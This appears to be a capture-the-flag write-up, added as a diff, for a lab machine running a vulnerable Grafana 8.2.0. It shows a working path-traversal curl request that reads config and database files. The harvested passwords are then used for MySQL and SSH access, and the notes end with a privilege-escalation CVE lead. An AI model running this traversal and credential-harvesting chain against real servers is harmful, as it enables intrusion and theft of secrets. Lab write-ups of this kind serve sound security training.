@@ -1,0 +1,83 @@
+on the nmap we can see port 3000 open and ve can see the version of grafana on it (v8.2.0 (d7f71e9eae))
+a quick google search show thats it is vulnerable to a Directory Traversal and Arbitrary File Read - https://www.exploit-db.com/exploits/50581
+with that exploit we can see files in the filesystem 
+as we search for grafana credentials lets check grafana config file
+/etc/grafana/grafana.ini
+
+#################################### Security ####################################
+[security]
+# disable creation of admin user on first start of grafana
+;disable_initial_admin_creation = false
+
+# default admin user, created on startup
+;admin_user = admin
+
+# default admin password, can be changed before first start of grafana,  or in profile settings
+admin_password = messageInABottle685427
+
+# used for signing
+;secret_key = SW2YcwTIb9zpOOhoPsMm
+
+now connect to the app
+
+Nothing of interest here, so let's dump the sqlite database:
+```curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db```
+
+Use sqlitebrowser to navigate the .sqlite file
+
+we can find in database data_source 
+password: dontStandSoCloseToMe63221!	
+user: grafana	
+database: grafana
+
+so we connect to mysql 
+
+➜  ~ mysql -u grafana -p -h 10.10.11.183
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 82
+Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)
+
+Copyright (c) 2000, 2022, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> use whackywidget;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables
+    -> ;
++------------------------+
+| Tables_in_whackywidget |
++------------------------+
+| users                  |
++------------------------+
+1 row in set (0,02 sec)
+
+mysql> select * from users;
++-----------+------------------------------------------+
+| user      | pass                                     |
++-----------+------------------------------------------+
+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
++-----------+------------------------------------------+
+1 row in set (0,02 sec)
+
+thats a b64
+
+➜  ~ echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
+anEnglishManInNewYork027468
+
+so lets ssh 
+ssh developer@10.10.11.183
+ 
+user.txt is here !
+
+linpeas says Vulnerable to CVE-2021-3560
+
+
